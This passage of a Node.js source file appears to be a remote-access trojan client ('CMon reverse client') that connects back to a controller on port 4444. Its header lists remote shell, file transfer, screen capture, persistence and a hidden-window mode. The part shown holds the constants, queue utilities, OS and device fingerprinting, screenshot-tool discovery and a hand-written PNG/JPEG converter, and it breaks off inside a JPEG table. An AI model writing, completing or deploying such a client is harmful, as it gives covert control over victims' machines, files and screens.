#!/usr/bin/env node
/*
 * client.js - Node.js port of client.py / client.cs (CMon reverse client).
 *
 * The wire protocol, commands, transfers, shell, screen share, upex and
 * persistence behaviour are kept byte-for-byte compatible with controller.py.
 * Only Node.js built-ins are used: net, tls, http is not needed for the
 * tunnels (the HTTP framing is implemented directly), crypto, fs, zlib,
 * child_process, os, path, url, dns and timers.
 *
 * The advanced connection selection (ordered candidates, self-signed TLS
 * fallback, WebSocket -> streaming HTTP -> half-duplex -> long-poll, cached
 * transport, dead-peer detection) follows the ideas from file-share.js, but
 * none of its file-sharing features are included here.
 *
 * Run: node client.js [address] [optional_port] [--persist|--remove-persist]
 *                      [--visible] [--log-file PATH]
 */

'use strict';

const net = require('net');
const tls = require('tls');
const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const path = require('path');
const zlib = require('zlib');
const dns = require('dns');
const { spawn: spawnChild } = require('child_process');
const { URL, fileURLToPath } = require('url');

// ---------------------------------------------------------------------------
// Constants (mirrors client.py)
// ---------------------------------------------------------------------------
const DEFAULT_IP = '192.168.0.113';
const DEFAULT_PORT = 4444;
const RETRY_DELAY = 1;
const CONNECT_TIMEOUT = 3;
const MAX_MSG = 96 * 1024 * 1024;
const TRANSFER_CHUNK = 1024 * 1024;
const MAX_TRANSFER_CHUNK = 4 * 1024 * 1024;
const TRANSFER_ENTRY_BATCH = 4096;
const TRANSFER_ENTRY_BYTES = 4 * 1024 * 1024;
const MAX_CAPTURE_BYTES = 256 * 1024 * 1024;
const validConnectionTypes = ['auto', 'tcp', 'http', 'https'];
const CONNECTION_TYPE = String(process.env.TUNNEL_TYPE || 'auto').trim().toLowerCase();
const HTTP_HANDSHAKE_TIMEOUT = 10;
const HTTP_SEND_STALL_TIMEOUT = 30;
const HTTP_MAX_HEADER = 32 * 1024;
const HTTP_MAX_LINE = 4096;
const HTTP_MAX_CHUNK = MAX_MSG;
const CMON_MAGIC = Buffer.from('CMON2\n', 'ascii');
const CMON_ACK = Buffer.from('CMON2 OK\n', 'ascii');
const CMON_MARKER_HEADER = 'X-CMon';
const CMON_MARKER_VALUE = '1';
const CMON_VERSION = '2';
const CMON_USER_AGENT = 'cmon-client/2';
const CMON_WS_PROTOCOL = 'cmon.v1';
const CMON_WS_MAX_FRAME = 1024 * 1024;
const CMON_WS_PING = 20.0;
const CMON_WS_DEAD = 65.0;
const CMON_HTTP_PING = 20.0;
const CMON_HTTP_DEAD = 125.0;
const TUNNEL_PROBE_TIMEOUT = 12.0;
const HALF_UP_BATCH = 1024 * 1024;
const HALF_UP_TIMEOUT = 120;
const MAX_OUTPUT = 8 * 1024 * 1024;
const SCREEN_SIZE = [960, 540];
const SCREEN_JPEG_QUALITY = 70;
const SCREENSHOT_JPEG_QUALITY = 85;
const SCREEN_SEND_TIMEOUT = 30;
const SEND_TIMEOUT = 2;
const SEND_CHUNK = 512 * 1024;
const RECV_QUEUE_MAX = 4 * 1024 * 1024;
const SOCKET_BUFFER = 4 * 1024 * 1024;
const RECV_CHUNK = 1024 * 1024;
const RECV_STALL_TIMEOUT = 300;
const KEEPALIVE_IDLE = 5;
const KEEPALIVE_INTERVAL = 3;
const KEEPALIVE_COUNT = 3;
const CREATE_NO_WINDOW = 0x08000000;
const POLL_WAIT = 8.0;
const POLL_BATCH = 2 * 1024 * 1024;
const POLL_TIMEOUT = 25.0;
const SHELL_CONNECT_TIMEOUT = 25;
const SHELL_HANDSHAKE_TIMEOUT = 20;
const SCRIPT_PATH = (() => {
  try { return fs.realpathSync(process.argv[1] || __filename); }
  catch { return path.resolve(process.argv[1] || __filename); }
})();
// Stable Node-specific identity so this client can coexist with the Python
// (autorun-client.service / com.autorun.client) and C# (autorun-cmon-client)
// clients.  SCRIPT_PATH still records the real executable for restarting, so
// renaming client.js does not change the installed identity.
const AUTORUN_NAME = 'cmon-client-node';
const IS_WINDOWS = process.platform === 'win32';
const IS_DARWIN = process.platform === 'darwin';
const IS_LINUX = process.platform === 'linux';

const VALID_CONNECTION_TYPES = new Set(validConnectionTypes);

// ---------------------------------------------------------------------------
// Small utilities
// ---------------------------------------------------------------------------
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
function now() { return Date.now() / 1000; }

let LOG_FILE = null;
function log(...args) {
  if (!LOG_FILE) return;
  try {
    const line = new Date().toISOString() + ' ' + args.map((v) =>
      (typeof v === 'string' ? v : (() => { try { return JSON.stringify(v); } catch { return String(v); } })())
    ).join(' ') + '\n';
    fs.appendFileSync(LOG_FILE, line);
  } catch { /* logging must never break the client */ }
}
function setupLogging() {
  const file = (process.env.CMON_LOG || '').trim();
  if (file) {
    try { fs.appendFileSync(file, ''); LOG_FILE = file; } catch { LOG_FILE = null; }
  }
}

function errorText(e) {
  if (e == null) return 'unknown error';
  if (typeof e === 'string') return e;
  return e.message || String(e);
}

function isOn(value) {
  return ['1', 'true', 'yes', 'on'].includes(String(value || '').trim().toLowerCase());
}

class TransportNotSupported extends Error {
  constructor(message) { super(message); this.name = 'TransportNotSupported'; }
}
class CaptureError extends Error {
  constructor(message, attempts) {
    super(message);
    this.name = 'CaptureError';
    this.attempts = attempts || [];
  }
}

// A promise-chained mutex.  JSON replies, transfer messages and screen frames
// may be produced by independent async loops; without this their length
// prefixes and payloads could interleave.
class Mutex {
  constructor() { this.tail = Promise.resolve(); }
  run(fn) {
    const run = this.tail.then(fn, fn);
    this.tail = run.catch(() => {});
    return run;
  }
}

class AsyncQueue {
  constructor() {
    this.items = [];
    this.waiters = [];
    this.closed = false;
    this.error = null;
  }
  push(item) {
    if (this.closed) return;
    this.items.push(item);
    this._wake();
  }
  _wake() {
    if (!this.waiters.length) return;
    const waiters = this.waiters;
    this.waiters = [];
    for (const w of waiters) w();
  }
  get size() { return this.items.length; }
  shiftNow() { return this.items.length ? this.items.shift() : undefined; }
  async shift(timeoutMs = 0) {
    if (this.items.length) return this.items.shift();
    if (this.closed) return null;
    let timer = null;
    let timedOut = false;
    await new Promise((resolve) => {
      const done = () => {
        if (timer) clearTimeout(timer);
        resolve();
      };
      this.waiters.push(done);
      if (timeoutMs > 0) {
        timer = setTimeout(() => { timedOut = true; done(); }, timeoutMs);
        if (timer.unref) timer.unref();
      }
    });
    if (this.items.length) return this.items.shift();
    if (timedOut) return undefined;
    return null;
  }
  close(error = null) {
    this.closed = true;
    this.error = error;
    this._wake();
  }
  clear() { this.items = []; }
}

// A condition variable over a byte queue.  push() wakes every reader.
class ByteQueue {
  constructor(maxBytes = Infinity) {
    this.chunks = [];
    this.length = 0;
    this.waiters = [];
    this.roomWaiters = [];
    this.maxBytes = maxBytes;
    this.closed = false;
    this.error = null;
    this.lastPush = now();
  }
  push(buf) {
    if (!buf || !buf.length) return;
    this.chunks.push(buf);
    this.length += buf.length;
    this.lastPush = now();
    this._wake();
  }
  _wake() {
    if (!this.waiters.length) return;
    const waiters = this.waiters;
    this.waiters = [];
    for (const w of waiters) w();
  }
  _wakeRoom() {
    if (!this.roomWaiters.length) return;
    const waiters = this.roomWaiters;
    this.roomWaiters = [];
    for (const w of waiters) w();
  }
  async waitForRoom() {
    while (!this.closed && this.chunks.length && this.length >= this.maxBytes) {
      await new Promise((resolve) => this.roomWaiters.push(resolve));
    }
    return !this.closed;
  }
  close(error = null) {
    this.closed = true;
    if (error) this.error = error;
    this._wake();
    this._wakeRoom();
  }
  peek(n) {
    if (!this.length) return Buffer.alloc(0);
    const size = Math.min(n, this.length);
    if (this.chunks[0].length >= size) return this.chunks[0].subarray(0, size);
    const out = Buffer.allocUnsafe(size);
    let off = 0;
    for (const c of this.chunks) {
      const take = Math.min(c.length, size - off);
      c.copy(out, off, 0, take);
      off += take;
      if (off >= size) break;
    }
    return out;
  }
  take(n) {
    if (n <= 0) return Buffer.alloc(0);
    const size = Math.min(n, this.length);
    let out;
    if (this.chunks[0].length >= size) {
      out = this.chunks[0].subarray(0, size);
      if (this.chunks[0].length === size) this.chunks.shift();
      else this.chunks[0] = this.chunks[0].subarray(size);
    } else {
      out = Buffer.allocUnsafe(size);
      let off = 0;
      while (off < size) {
        const c = this.chunks[0];
        const take = Math.min(c.length, size - off);
        c.copy(out, off, 0, take);
        off += take;
        if (take === c.length) this.chunks.shift();
        else this.chunks[0] = c.subarray(take);
      }
    }
    this.length -= size;
    this._wakeRoom();
    if (this.onConsume) this.onConsume();
    return out;
  }
  async waitForData(timeoutMs) {
    if (this.length || this.closed) return;
    return this.waitForMore(timeoutMs);
  }
  // Always waits for *new* bytes, even when the queue already holds some.
  // readExact needs this: a large message arrives in several TCP segments, so
  // returning early because "some data is here" made it give up on the rest
  // and report a bogus end-of-message (which killed every chunked upload).
  async waitForMore(timeoutMs) {
    if (this.closed) return false;
    let timer = null;
    let timedOut = false;
    await new Promise((resolve) => {
      const done = () => {
        if (timer) { clearTimeout(timer); timer = null; }
        resolve();
      };
      const waiter = () => done();
      this.waiters.push(waiter);
      if (timeoutMs > 0 && Number.isFinite(timeoutMs)) {
        timer = setTimeout(() => {
          timedOut = true;
          const index = this.waiters.indexOf(waiter);
          if (index >= 0) this.waiters.splice(index, 1);
          done();
        }, timeoutMs);
        if (timer.unref) timer.unref();
      }
    });
    return !timedOut;
  }
  async readSome(max, opts = {}) {
    const deadline = opts.deadline || null;
    while (!this.length) {
      if (this.closed) return null;
      let wait = null;
      if (deadline) {
        wait = (deadline - now()) * 1000;
        if (wait <= 0) return null;
      }
      await this.waitForData(wait);
      if (!this.length && this.closed) return null;
      if (!this.length && deadline && now() >= deadline) return null;
    }
    return this.take(Math.min(max, this.length));
  }
  async readExact(n, opts = {}) {
    const stallFirst = !!opts.stallFirst;
    const deadline = opts.deadline || null;
    let got = 0;
    while (this.length < n) {
      if (this.closed) return null;
      let wait = null;
      if (deadline) {
        wait = (deadline - now()) * 1000;
        if (wait <= 0) return null;
        if (got > 0 || stallFirst) wait = Math.min(wait, RECV_STALL_TIMEOUT * 1000);
      } else if (got > 0 || stallFirst) {
        wait = RECV_STALL_TIMEOUT * 1000;
      }
      const before = this.length;
      await this.waitForMore(wait);
      if (this.length > before) got += this.length - before;
      if (this.length < n && this.closed) return null;
      if (this.length < n && wait !== null && this.length === before) return null;
      if (this.length < n && deadline && now() >= deadline) return null;
    }
    return this.take(n);
  }
  async readUntil(delim, max, opts = {}) {
    const deadline = opts.deadline || null;
    while (true) {
      const idx = this.chunks.length ? this._indexOf(delim) : -1;
      if (idx >= 0) return this.take(idx + delim.length);
      if (this.length > max) return null;
      if (this.closed) return null;
      let wait = null;
      if (deadline) {
        wait = (deadline - now()) * 1000;
        if (wait <= 0) return null;
        wait = Math.min(wait, RECV_STALL_TIMEOUT * 1000);
      }
      await this.waitForData(wait);
      if (deadline && now() >= deadline) return null;
    }
  }
  _indexOf(delim) {
    const all = this.peek(this.length);
    const i = all.indexOf(delim);
    return i;
  }
  async readToEof(opts = {}) {
    const deadline = opts.deadline || null;
    const cap = opts.cap || MAX_MSG;
    const out = [];
    let total = 0;
    while (true) {
      if (this.length) {
        const piece = this.take(Math.min(this.length, cap - total));
        out.push(piece);
        total += piece.length;
        if (total >= cap) break;
      }
      if (this.closed) break;
      let wait = null;
      if (deadline) {
        wait = (deadline - now()) * 1000;
        if (wait <= 0) break;
      }
      if (!(await this.waitForData(wait))) break;
    }
    return Buffer.concat(out, total);
  }
}

// ---------------------------------------------------------------------------
// Platform detection / environment
// ---------------------------------------------------------------------------
const PLATFORM_CACHE = {};
let ANDROID_PROPS = null;
let ANDROID_ROOT = null;
let ANDROID_ROOT_DENIED = 0;

function fileExists(p) { try { return fs.statSync(p).isFile(); } catch { return false; } }
function anyExists(p) { try { fs.statSync(p); return true; } catch { return false; } }

function isAndroid() {
  if (PLATFORM_CACHE.android === undefined) {
    let result = false;
    try {
      const prefix = process.env.PREFIX || '';
      result = !!(process.env.ANDROID_ROOT === '/system'
        || prefix.startsWith('/data/data/com.termux')
        || (anyExists('/system/build.prop') && anyExists('/system/bin/sh')));
    } catch { result = false; }
    PLATFORM_CACHE.android = result;
  }
  return PLATFORM_CACHE.android;
}

function readSystemVersionPlist() {
  try {
    const text = fs.readFileSync('/System/Library/CoreServices/SystemVersion.plist', 'utf8');
    const get = (key) => {
      const m = text.match(new RegExp('<key>' + key + '</key>\\s*<string>([^<]*)</string>'));
      return m ? m[1] : '';
    };
    return { product: get('ProductName'), version: get('ProductVersion') };
  } catch { return { product: '', version: '' }; }
}

function isIOS() {
  if (PLATFORM_CACHE.ios === undefined) {
    let result = false;
    if (process.platform === 'ios') result = true;
    else if (IS_DARWIN) {
      const info = readSystemVersionPlist();
      result = /iPhone OS|iPadOS|^iOS$/.test(info.product || '');
    }
    PLATFORM_CACHE.ios = result;
  }
  return PLATFORM_CACHE.ios;
}
function isMacOS() {
  if (PLATFORM_CACHE.macos === undefined) {
    PLATFORM_CACHE.macos = IS_DARWIN && !isIOS();
  }
  return PLATFORM_CACHE.macos;
}
function guiSessionAvailable() {
  if (!IS_LINUX || isAndroid()) return true;
  return !!(process.env.DISPLAY || process.env.WAYLAND_DISPLAY);
}

function androidProps() {
  if (ANDROID_PROPS !== null) return ANDROID_PROPS;
  const props = {};
  const exe = which('getprop') || '/system/bin/getprop';
  try {
    const out = execFileSync(exe, [], { timeout: 5000 });
    for (const line of out.toString('utf8').split(/\r?\n/)) {
      const m = line.match(/^\[([^\]]+)\]:\s*\[(.*)\]$/);
      if (m) props[m[1]] = m[2];
    }
  } catch { /* best effort */ }
  ANDROID_PROPS = props;
  return props;
}
function androidApi() {
  const env = String(process.env.ANDROID__BUILD_VERSION_SDK || '').trim();
  if (/^\d+$/.test(env)) return parseInt(env, 10);
  const v = parseInt(androidProps()['ro.build.version.sdk'] || '0', 10);
  return Number.isFinite(v) ? v : 0;
}
function androidName() {
  const p = androidProps();
  const version = p['ro.build.version.release'];
  if (!version) return 'Android (version unknown)';
  let name = 'Android ' + version;
  if (p['ro.build.version.sdk']) name += ' (API ' + p['ro.build.version.sdk'] + ')';
  const device = [p['ro.product.manufacturer'] || '', p['ro.product.model'] || '']
    .filter(Boolean).join(' ').trim();
  if (device) name += ' - ' + device;
  return name;
}
function iosName() {
  let version = readSystemVersionPlist().version;
  if (!version && typeof os.version === 'function') {
    const m = String(os.version()).match(/\d+(?:\.\d+)*/);
    if (m) version = m[0];
  }
  return version ? 'iOS ' + version : 'iOS';
}
const MACOS_CODENAMES = { 26: 'Tahoe', 27: 'Golden Gate' };
function macosName() {
  let version = '';
  try { version = execFileSync('/usr/bin/sw_vers', ['-productVersion'], { timeout: 3000 }).toString().trim(); }
  catch { version = os.release(); }
  const major = parseInt(version.split('.')[0], 10);
  const codename = MACOS_CODENAMES[major];
  return 'macOS ' + version + (codename ? ' (' + codename + ')' : '');
}

function parseOsRelease() {
  try {
    const text = fs.readFileSync('/etc/os-release', 'utf8');
    const info = {};
    for (const line of text.split(/\r?\n/)) {
      const i = line.indexOf('=');
      if (i <= 0) continue;
      let key = line.slice(0, i).trim();
      let value = line.slice(i + 1).trim();
      if ((value.startsWith('"') && value.endsWith('"'))
        || (value.startsWith("'") && value.endsWith("'"))) value = value.slice(1, -1);
      info[key] = value;
    }
    return info;
  } catch { return {}; }
}
function distroInfo() {
  if (isAndroid()) return ['android', androidName()];
  if (isIOS()) return ['ios', iosName()];
  if (isMacOS()) return ['macos', macosName()];
  if (!IS_LINUX) {
    return [(os.type() || 'unknown').toLowerCase(),
      os.type() + ' ' + os.release()];
  }
  const info = parseOsRelease();
  const id = String(info.ID || 'linux').trim().toLowerCase();
  const name = String(info.PRETTY_NAME || info.NAME || 'Linux').trim();
  return [id, name];
}

function which(command) {
  if (!command) return null;
  if (command.includes('/') || command.includes('\\')) {
    try {
      const st = fs.statSync(command);
      if (st.isFile()) return command;
    } catch { /* fall through */ }
  }
  const pathText = process.env.PATH || '';
  const exts = IS_WINDOWS
    ? (process.env.PATHEXT || '.EXE;.CMD;.BAT;.COM').split(';').filter(Boolean)
    : [''];
  for (const dir of pathText.split(IS_WINDOWS ? ';' : ':')) {
    if (!dir) continue;
    for (const ext of exts) {
      const p = path.join(dir, command + (IS_WINDOWS && !command.toLowerCase().endsWith(ext.toLowerCase()) ? ext : ''));
      try {
        if (fs.statSync(p).isFile()) return p;
      } catch { /* continue */ }
    }
  }
  return null;
}

function execFileSync(command, args, opts = {}) {
  const result = require('child_process').spawnSync(command, args, {
    timeout: opts.timeout || 15000,
    encoding: opts.encoding === undefined ? null : opts.encoding,
    stdio: ['ignore', 'pipe', 'pipe'],
    windowsHide: true,
    maxBuffer: opts.maxBuffer || MAX_CAPTURE_BYTES,
    env: opts.env || process.env,
  });
  if (result.error) throw result.error;
  if (result.status !== 0) {
    const stderr = result.stderr ? result.stderr.toString('utf8') : '';
    const e = new Error('exit status ' + result.status + (stderr.trim() ? ': ' + stderr.trim() : ''));
    e.status = result.status;
    e.stderr = result.stderr;
    throw e;
  }
  return result.stdout || Buffer.alloc(0);
}

function runQuiet(args, timeoutMs = 30000) {
  try {
    const r = require('child_process').spawnSync(args[0], args.slice(1), {
      timeout: timeoutMs, stdio: 'ignore', windowsHide: true,
    });
    return r.status === 0;
  } catch { return false; }
}

function getOsInfo() {
  if (isAndroid()) return androidName();
  if (isIOS()) return iosName();
  if (isMacOS()) return macosName();
  if (IS_LINUX) {
    const info = parseOsRelease();
    return 'Linux (' + String(info.NAME || 'Generic Linux').replace(/^"|"$/g, '') + ')';
  }
  if (IS_WINDOWS) return 'Windows ' + String(os.version ? os.version() : os.release());
  return os.type();
}
function isOmarchy() {
  if (isAndroid() || isMacOS() || isIOS()) return false;
  if (!IS_LINUX) return false;
  try { return fs.readFileSync('/etc/os-release', 'utf8').toLowerCase().includes('omarchy'); }
  catch { return false; }
}

function imageMagickCommand() {
  let exe = which('magick') || which('magick-im7.q16');
  if (exe) return [exe, 'import', '-window', 'root', 'png:-'];
  exe = which('import') || which('import-im7.q16');
  if (exe) return [exe, '-window', 'root', 'png:-'];
  return null;
}

function environmentReport() {
  const [distroId, distroName] = distroInfo();
  let session;
  let desktop;
  if (isAndroid()) {
    session = 'android';
    desktop = (process.env.PREFIX || '').startsWith('/data/data/com.termux') ? 'Termux' : 'Android';
  } else if (isIOS()) {
    session = 'ios'; desktop = 'iOS';
  } else if (isMacOS()) {
    session = (process.env.SSH_CONNECTION || process.env.SSH_TTY) ? 'ssh' : 'aqua';
    desktop = session === 'aqua' ? 'Aqua' : 'macOS';
  } else if (IS_LINUX) {
    session = process.env.WAYLAND_DISPLAY ? 'wayland' : (process.env.DISPLAY ? 'x11' : 'none');
    desktop = process.env.XDG_CURRENT_DESKTOP || 'unknown';
  } else {
    session = 'desktop'; desktop = os.type();
  }
  let osName;
  if (isAndroid()) osName = 'android';
  else if (isIOS()) osName = 'ios';
  else if (isMacOS()) osName = 'macos';
  else if (IS_WINDOWS) osName = 'windows';
  else if (IS_LINUX) osName = 'linux';
  else osName = os.type().toLowerCase();

  const helpers = {
    pillow: false,                 // no Python/Pillow; internal conversion is used
    pyautogui: false,
    grim: !!which('grim'),
    spectacle: !!which('spectacle'),
    gnome_dbus: !!which('gdbus'),
    gnome_screenshot: !!which('gnome-screenshot'),
    imagemagick: imageMagickCommand() !== null,
    scrot: !!which('scrot'),
    maim: !!which('maim'),
    screencapture: !!which('screencapture') || (isMacOS() && anyExists('/usr/sbin/screencapture')),
    screencap: !!(which('screencap') || anyExists('/system/bin/screencap')),
    termux_api: !!(which('termux-open') || which('termux-clipboard-get')),
  };
  // JS has its own capture/conversion path.  Advertise a known helper so the
  // controller's "capture missing" banner does not contradict reality.
  if (IS_WINDOWS && (which('powershell') || which('powershell.exe') || which('pwsh'))) {
    helpers.pillow = true;
  }
  return {
    os: osName,
    distro: distroId,
    distro_name: distroName,
    session,
    desktop,
    python: 'Node ' + process.version,
    helpers,
  };
}

function captureDiag(exc) {
  const env = environmentReport();
  const helpers = env.helpers || {};
  let category;
  if (isIOS()) category = 'ios';
  else if (isAndroid()) category = 'android';
  else if (env.session === 'none') category = 'no_session';
  else if (!['pillow', 'pyautogui', 'grim', 'spectacle', 'gnome_screenshot',
    'gnome_dbus', 'imagemagick', 'scrot', 'maim', 'screencapture'].some((k) => helpers[k])) {
    category = 'missing_deps';
  } else category = 'all_failed';
  return {
    kind: 'capture',
    category,
    attempts: (exc && exc.attempts && exc.attempts.length) ? exc.attempts.slice() : [errorText(exc)],
    env,
  };
}

// ---------------------------------------------------------------------------
// PNG decoder / resizer / JPEG encoder
//
// Node has no image library, and installing one is forbidden.  Screen captures
// from Android, Windows, GNOME and maim are PNG; this small, dependency-free
// pipeline converts them to the JPEG stream the controller expects.  JPEG
// captures (macOS screencapture, grim -t jpeg) are passed through untouched.
// ---------------------------------------------------------------------------
const PNG_SIGNATURE = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);

function paeth(a, b, c) {
  const p = a + b - c;
  const pa = Math.abs(p - a), pb = Math.abs(p - b), pc = Math.abs(p - c);
  if (pa <= pb && pa <= pc) return a;
  if (pb <= pc) return b;
  return c;
}

function unfilterRows(data, offset, rowBytes, rows, bpp) {
  const out = Buffer.allocUnsafe(rowBytes * rows);
  let prev = Buffer.alloc(rowBytes);
  let src = offset;
  for (let y = 0; y < rows; y++) {
    if (src >= data.length) throw new Error('PNG data ended early');
    const filter = data[src++];
    const row = out.subarray(y * rowBytes, (y + 1) * rowBytes);
    if (src + rowBytes > data.length) throw new Error('PNG data ended early');
    data.copy(row, 0, src, src + rowBytes);
    src += rowBytes;
    for (let i = 0; i < rowBytes; i++) {
      const x = row[i];
      const a = i >= bpp ? row[i - bpp] : 0;
      const b = prev[i];
      const c = i >= bpp ? prev[i - bpp] : 0;
      let v;
      switch (filter) {
        case 0: v = x; break;
        case 1: v = x + a; break;
        case 2: v = x + b; break;
        case 3: v = x + ((a + b) >> 1); break;
        case 4: v = x + paeth(a, b, c); break;
        default: throw new Error('bad PNG filter ' + filter);
      }
      row[i] = v & 0xff;
    }
    prev = row;
  }
  return { out, next: src };
}

function pngSample(buf, p, bitDepth) {
  if (bitDepth === 8) return buf[p];
  if (bitDepth === 16) return buf[p];
  // Sub-byte samples are unpacked by the caller.
  return 0;
}

function decodePng(buffer) {
  if (!buffer || buffer.length < 8 || !buffer.subarray(0, 8).equals(PNG_SIGNATURE)) {
    throw new Error('not a PNG image');
  }
  let off = 8;
  let width = 0, height = 0, bitDepth = 8, colorType = 0, interlace = 0;
  let palette = null;
  const idat = [];
  while (off + 8 <= buffer.length) {
    const len = buffer.readUInt32BE(off);
    const type = buffer.toString('ascii', off + 4, off + 8);
    off += 8;
    if (off + len + 4 > buffer.length) throw new Error('truncated PNG chunk');
    const data = buffer.subarray(off, off + len);
    off += len + 4; // skip CRC
    if (type === 'IHDR') {
      width = data.readUInt32BE(0);
      height = data.readUInt32BE(4);
      bitDepth = data[8];
      colorType = data[9];
      if (data[10] !== 0 || data[11] !== 0) throw new Error('unsupported PNG compression');
      interlace = data[12];
    } else if (type === 'PLTE') {
      palette = Buffer.from(data);
    } else if (type === 'IDAT') {
      idat.push(Buffer.from(data));
    } else if (type === 'IEND') break;
  }
  if (!width || !height) throw new Error('PNG has no IHDR');
  if (![8, 16, 1, 2, 4].includes(bitDepth)) throw new Error('unsupported PNG bit depth');
  if (![0, 2, 3, 4, 6].includes(colorType)) throw new Error('unsupported PNG colour type');
  const channels = { 0: 1, 2: 3, 3: 1, 4: 2, 6: 4 }[colorType];
  if (colorType === 3 && !palette) throw new Error('PNG palette missing');
  const raw = zlib.inflateSync(Buffer.concat(idat));
  const bpp = Math.max(1, Math.ceil((channels * bitDepth) / 8));
  const out = Buffer.alloc(width * height * 3);

  const writePixel = (x, y, rgb) => {
    const o = (y * width + x) * 3;
    out[o] = rgb[0]; out[o + 1] = rgb[1]; out[o + 2] = rgb[2];
  };

  const decodePass = (startX, startY, stepX, stepY, passW, passH, srcOffset) => {
    if (passW <= 0 || passH <= 0) return srcOffset;
    const rowBytes = Math.ceil((passW * channels * bitDepth) / 8);
    const { out: rows, next } = unfilterRows(raw, srcOffset, rowBytes, passH, bpp);
    for (let py = 0; py < passH; py++) {
      let p = py * rowBytes;
      let bitPos = 0;
      const nextSample = () => {
        if (bitDepth === 8) return rows[p++];
        if (bitDepth === 16) { const v = rows[p]; p += 2; return v; }
        const byte = rows[p + (bitPos >> 3)];
        const shift = 8 - bitDepth - (bitPos & 7);
        bitPos += bitDepth;
        return (byte >> shift) & ((1 << bitDepth) - 1);
      };
      for (let px = 0; px < passW; px++) {
        let rgb;
        if (colorType === 3) {
          const idx = nextSample();
          const o = idx * 3;
          rgb = [palette[o] || 0, palette[o + 1] || 0, palette[o + 2] || 0];
        } else if (colorType === 0 || colorType === 4) {
          const g = nextSample();
          if (colorType === 4) nextSample(); // alpha
          rgb = [g, g, g];
        } else {
          const r = nextSample(), g = nextSample(), b = nextSample();
          if (colorType === 6) nextSample(); // alpha
          rgb = [r, g, b];
        }
        const x = startX + px * stepX, y = startY + py * stepY;
        if (x < width && y < height) writePixel(x, y, rgb);
      }
    }
    return next;
  };

  if (interlace === 0) {
    decodePass(0, 0, 1, 1, width, height, 0);
  } else if (interlace === 1) {
    const xs = [0, 4, 0, 2, 0, 1, 0];
    const ys = [0, 0, 4, 0, 2, 0, 1];
    const dx = [8, 8, 4, 4, 2, 2, 1];
    const dy = [8, 8, 8, 4, 4, 2, 2];
    let src = 0;
    for (let pass = 0; pass < 7; pass++) {
      const pw = Math.floor((width - xs[pass] + dx[pass] - 1) / dx[pass]);
      const ph = Math.floor((height - ys[pass] + dy[pass] - 1) / dy[pass]);
      src = decodePass(xs[pass], ys[pass], dx[pass], dy[pass], pw, ph, src);
    }
  } else {
    throw new Error('unsupported PNG interlace method');
  }
  return { width, height, data: out };
}

function fitRgb(image, maxW, maxH) {
  const { width: w, height: h, data } = image;
  const scale = Math.min(1, maxW / w, maxH / h);
  if (scale >= 1) return image;
  const ow = Math.max(1, Math.round(w * scale));
  const oh = Math.max(1, Math.round(h * scale));
  const out = Buffer.alloc(ow * oh * 3);
  const x0 = new Int32Array(ow), x1 = new Int32Array(ow), fx = new Float32Array(ow);
  for (let x = 0; x < ow; x++) {
    const sx = (x + 0.5) / scale - 0.5;
    let a = Math.floor(sx);
    const f = sx - a;
    if (a < 0) { a = 0; }
    if (a > w - 1) a = w - 1;
    x0[x] = a; x1[x] = Math.min(w - 1, a + 1); fx[x] = f;
  }
  for (let y = 0; y < oh; y++) {
    const sy = (y + 0.5) / scale - 0.5;
    let ay = Math.floor(sy);
    const fy = sy - ay;
    if (ay < 0) ay = 0;
    if (ay > h - 1) ay = h - 1;
    const by = Math.min(h - 1, ay + 1);
    const rowa = ay * w * 3, rowb = by * w * 3, rowo = y * ow * 3;
    for (let x = 0; x < ow; x++) {
      const ax = x0[x], bx = x1[x], ffx = fx[x];
      for (let c = 0; c < 3; c++) {
        const p00 = data[rowa + ax * 3 + c], p10 = data[rowa + bx * 3 + c];
        const p01 = data[rowb + ax * 3 + c], p11 = data[rowb + bx * 3 + c];
        const top = p00 + (p10 - p00) * ffx;
        const bot = p01 + (p11 - p01) * ffx;
        out[rowo + x * 3 + c] = (top + (bot - top) * fy + 0.5) | 0;
      }
    }
  }
  return { width: ow, height: oh, data: out };
}

const JPEG_ZIGZAG = [
  0, 1, 8, 16, 9, 2, 3, 10, 17, 24, 32, 25, 18, 11, 4, 5,
  12, 19, 26, 33, 40, 48, 41, 34, 27, 20, 13, 6, 7, 14, 21, 28,
  35, 42, 49, 56, 57, 50, 43, 36, 29, 22, 15, 23, 30, 37, 44, 51,
  58, 59, 52, 45, 38, 31, 39, 46, 53, 60, 61, 54, 47, 55, 62, 63,
];
const JPEG_LUM_QUANT = [
  16, 11, 10, 16, 24, 40, 51, 61,
  12, 12, 14, 19, 26, 58, 60, 55,
  14, 13, 16, 24, 40, 57, 69, 56,
  14, 17, 22, 29, 51, 87, 80, 62,
  18, 22, 37, 56, 68, 109, 103, 77,
  24, 35, 55, 64, 81, 104, 113, 92,
  49, 64, 78, 87, 103, 121, 120, 101,
  72, 92, 95, 98, 112, 100, 103, 99,
];
const JPEG_CHR_QUANT = [
  17, 18, 24, 47, 99, 99, 99, 99,
  18, 21, 26, 66, 99, 99, 99, 99,
  24, 26, 56, 99, 99, 99, 99, 99,
  47, 66, 99, 99, 99, 99, 99, 99,
  99, 99, 99, 99, 99, 99, 99, 99,
  99, 99, 99, 99, 99, 99, 99, 99,
  99, 99, 99, 99, 99, 99, 99, 99,
  99, 99, 99, 99, 99, 99, 99, 99,
];
const JPEG_DC_LUM_BITS = [0, 1, 5, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0];
const JPEG_DC_CHR_BITS = [0, 3, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0];
const JPEG_DC_VALS = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11];
const JPEG_AC_LUM_BITS = [0, 2, 1, 3, 3, 2, 4, 3, 5, 5, 4, 4, 0, 0, 1, 0x7d];
const JPEG_AC_LUM_VALS = [
  0x01, 0x02, 0x03, 0x00, 0x04, 0x11, 0x05, 0x12, 0x21, 0x31, 0x41, 0x06,
  0x13, 0x51, 0x61, 0x07, 0x22, 0x71, 0x14, 0x32, 0x81, 0x91, 0xa1, 0x08,
  0x23, 0x42, 0xb1, 0xc1, 0x15, 0x52, 0xd1, 0xf0, 0x24, 0x33, 0x62, 0x72,
  0x82, 0x09, 0x0a, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x25, 0x26, 0x27, 0x28,
